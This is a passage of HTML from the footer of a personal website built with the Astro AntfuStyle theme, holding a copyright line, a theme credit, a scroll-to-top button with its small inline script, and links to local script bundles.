lt-sm:flex-col items-center text-sm whitespace-nowrap"> <span>© 2026 NickyWU</span> <span class="lt-sm:hidden">&nbsp;|&nbsp;</span> <span>
Powered by
<a class="op-60 no-underline hover:op-100 op-100! color-[--fg]!" href="https://github.com/lin-stephanie/astro-antfustyle-theme">  
Astro AntfuStyle Theme
</a> </span> </div> </div> </footer> <button id="to-top-button" class="z-50 fixed right-5 bottom-6
    w-10 h-10 rounded-full
    op-0 pointer-events-none op-transition
    lt-lgp:op-50! lt-lgp:bg-#8883 lt-lgp:dark:bg-#8886 lt-lgp:pointer-events-auto!
    hover:op-100! hover:bg-#8883 print:hidden" title="Scroll to top"> <div u-i-ri-arrow-up-line></div> </button> <script type="module">document.addEventListener("astro:page-load",()=>{const o=()=>{window.scrollTo({top:0})};document.getElementById("to-top-button")?.addEventListener("click",o)});const e=()=>{const t=document.getElementById("to-top-button");t&&window.matchMedia("(min-width: 1024px)").matches&&((window.scrollY||document.documentElement.scrollTop)<=300?(t.style.opacity="0",t.style.pointerEvents="none"):(t.style.opacity="0.3",t.style.pointerEvents="auto"))};window.addEventListener("scroll",e);</script> <!-- Panel Backdrop (on mobile) --> <div id="backdrop" class="hidden z-75 fixed inset-0 bg-[#ffffffcc] dark:bg-[#000000cc]" aria-hidden="true"></div> <script type="module" src="/mywebsite/_astro/Backdrop.astro_astro_type_script_index_0_lang.CFnpENJb.js"></script> <!-- Progress Bar --> <script type="module" src="/mywebsite/_astro/BaseLayout.astro_astro_type_script_index_0_lang.Bg06K9ze.js"></script> </body> </html>